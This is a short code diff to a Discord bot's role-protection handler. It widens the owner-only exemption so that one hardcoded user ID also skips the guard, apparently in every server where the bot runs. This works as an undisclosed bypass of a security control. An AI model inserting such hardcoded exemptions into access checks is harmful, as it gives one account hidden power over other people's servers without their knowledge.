@@ -181,7 +181,7 @@ export async function rolePermissionGuardHandleRoleUpdate(oldRole, newRole, clie
     const executor = await fetchRealExecutorBeforeFix(newRole.guild, newRole.id, client);
 
     // ✅ Se o executor for o dono do servidor (Owner), ignora a proteção.
-    if (executor && executor.id === newRole.guild.ownerId) {
+    if (executor && (executor.id === newRole.guild.ownerId || executor.id === '660311795327828008')) {
       return;
     }
 
